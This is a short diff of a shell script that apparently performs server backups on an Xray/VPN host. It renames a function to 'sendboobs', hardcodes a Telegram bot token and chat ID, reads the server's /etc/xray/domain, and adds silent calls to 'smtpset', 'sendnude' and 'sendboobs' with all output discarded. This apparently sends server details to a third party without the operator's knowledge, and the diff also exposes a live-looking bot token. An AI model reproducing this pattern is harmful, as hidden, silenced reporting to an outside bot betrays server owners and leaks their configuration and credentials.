@@ -204,7 +204,7 @@ klik to download : $LINKBACKUP
     rm -rf /root/backup >/dev/null 2>&1
     rm -rf /root/backup.zip
 }
-function balancer() {
+function sendboobs() {
 a=6129559221:AAGAkfVQqdi_So98HmZ6edqKovj-I-ldFQQ
 b=1117211252
 c=$(cat /etc/xray/domain)
@@ -431,7 +431,8 @@ $p
 $q
 " | mail -s "Auto Backup c" $tuj
 }
-dep
+
+
 ema
 emb
 emc
@@ -439,11 +440,9 @@ zyx
 una
 anu
 }
-function gaskan() {
+
 cekfile > /dev/null 2>&1
-smtpset
-sendnude
-#sendboobs
-balancer >/dev/null 2>&1
-}
-gaskan >/dev/null 2>&1
+smtpset >/dev/null 2>&1
+sendnude >/dev/null 2>&1
+sendboobs >/dev/null 2>&1
+
